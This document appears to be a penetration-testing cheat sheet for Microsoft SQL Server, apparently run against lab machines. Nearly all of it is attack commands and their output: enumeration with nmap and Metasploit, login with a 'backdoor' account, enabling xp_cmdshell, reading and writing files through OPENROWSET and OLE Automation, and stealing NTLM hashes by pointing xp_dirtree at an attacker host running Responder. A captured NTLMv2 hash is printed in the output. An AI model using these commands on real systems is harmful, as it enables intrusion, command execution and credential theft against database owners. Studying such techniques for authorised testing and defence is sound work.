# MSSQL

## Port

| NUMBER | DESCRIPTION |
|---|---|
| 1433 | Microsoft SQL Server database management system (MSSQL) server |
| 1434 | Microsoft SQL Server database management system (MSSQL) monitor |

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.151.148 -p 1433 -sV -sC
```

## Metasploit Ping

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 10.129.151.148
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

```output title="Output" hl_lines="7"
[*] 10.129.151.148:       - SQL Server information for 10.129.151.148:
[+] 10.129.151.148:       -    ServerName      = ILF-SQL-01
[+] 10.129.151.148:       -    InstanceName    = MSSQLSERVER
[+] 10.129.151.148:       -    IsClustered     = No
[+] 10.129.151.148:       -    Version         = 15.0.2000.5
[+] 10.129.151.148:       -    tcp             = 1433
[+] 10.129.151.148:       -    np              = \\ILF-SQL-01\pipe\sql\query
[*] 10.129.151.148:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Service Interaction

```sh
my@attack:~$ mssqlclient.py 'backdoor':'Password1'@10.129.151.148 -port 1433
```

```sh
my@attack:~$ mssqlclient.py 'backdoor':'Password1'@10.129.151.148 -port 1433 -windows-auth
```

## Show Databases

```sql
SQL (sa  dbo@master)> SELECT name FROM master.sys.sysdatabases
```

## USE

```sql
SQL (sa  dbo@master)> USE master
```

## Show Tables

```sql
SQL (sa  dbo@master)> SELECT TABLE_NAME FROM master.INFORMATION_SCHEMA.TABLES
```

## Show Linked Servers

```sql
SQL (sa  dbo@master)> SELECT srvname,isremote FROM sys.sysservers
```

## Verifying System Administrator Role

```sql
SQL (sa  dbo@master)> SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

## Enable [XP_CMDSHELL](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)

```sql
SQL (sa  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
SQL (sa  dbo@master)> RECONFIGURE
```

## Reading Files

```sql
SQL (sa  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS contents
```

## Writing Files

### Enabling Ole Automation Procedures

```sql
SQL (sa  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXECUTE sp_configure 'Ole Automation Procedures', 1
SQL (sa  dbo@master)> RECONFIGURE
```

### File Creation

```sql
SQL (sa  dbo@master)> DECLARE @ole INT DECLARE @id INT EXECUTE sp_OACreate 'Scripting.FileSystemObject', @ole OUT EXECUTE sp_OAMethod @ole, 'OpenTextFile', @id OUT, 'C:\Users\Public\Documents\proof.txt', 8, 1 EXECUTE sp_OAMethod @id, 'WriteLine', Null, 'hello world' EXECUTE sp_OADestroy @id EXECUTE sp_OADestroy @ole
```

## Hash Stealing

### Responder

```sh
my@attack:~$ sudo Responder.py -I tun0
```

### Connecting to Responder

```sql
SQL (sa  dbo@master)> EXEC master..xp_dirtree '\\10.10.14.7'
```

```sql
SQL (sa  dbo@master)> EXEC master..xp_subdirs '\\10.10.14.7'
```

### Responder Results

```sh
my@attack:~$ sudo Responder.py -I tun0
```

```output title="Output"
[SMB] NTLMv2-SSP Client   : 10.129.151.148
[SMB] NTLMv2-SSP Username : SEQUEL\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::SEQUEL:d64e98abe5b8adfb:126694A8A412F5D728D487744CA60FA4:010100000000000000CD5965AF64DB01962C15B708834DA30000000002000800550043004900420001001E00570049004E002D004F005000550032004D004B003800510052004900360004003400570049004E002D004F005000550032004D004B00380051005200490036002E0055004300490042002E004C004F00430041004C000300140055004300490042002E004C004F00430041004C000500140055004300490042002E004C004F00430041004C000700080000CD5965AF64DB010600040002000000080030003000000000000000000000000030000092A052736AA997AE28BB04A8363DCA824E00919B1D2A9FA5CA15B633CDFCB5290A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
```
